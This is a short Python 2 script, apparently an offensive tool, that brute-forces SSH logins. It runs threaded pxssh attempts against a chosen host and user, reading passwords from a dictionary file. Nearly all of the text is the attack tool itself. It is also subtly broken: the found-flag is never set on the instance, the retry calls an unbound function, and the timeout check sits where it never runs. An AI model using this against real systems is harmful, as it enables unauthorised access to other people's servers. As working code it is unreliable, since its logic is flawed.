#!/usr/bin/python

import pxssh
import optparse
import time
from threading import *

class bSsh:
	def __init__(self):
		self.maxConnections = 5
		self.connection_lock = BoundedSemaphore(value=self.maxConnections)
		self.Found = False
		self.Fails = 0

	def connect(self, host, user, password, release):
		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			print '[+] Password Found: ' + password
			Found = True
		except Exception, e:
			if 'read_nonblocking' in str(e):
				self.Fails += 1
				time.sleep(5)
				connect(host, user, password, False)
			elif 'synchronize with original prompt' in str(e):
				time.sleep(1)
				connect(host, user, password, False)
		finally:
			if release:
				self.connection_lock.release()

	def checkMe(self, myHost, myUser, myDict):
		print "[*] Attempting to bruteforce user: " + str(myUser) + " on host: " + str(myHost) + "\r"
		fn = open(myDict, 'r')
		for line in fn.readlines():
			if self.Found:
				print "[*] Exiting: Password Found"
				exit(0)
				if self.Fails > 5:
					print "[!] Exiting: Too Many Socket Timeouts"
					exit(0)
			self.connection_lock.acquire()
			password = line.strip('\r').strip('\n')
			t = Thread(target=self.connect, args=(myHost, myUser, password, True))
			child = t.start()
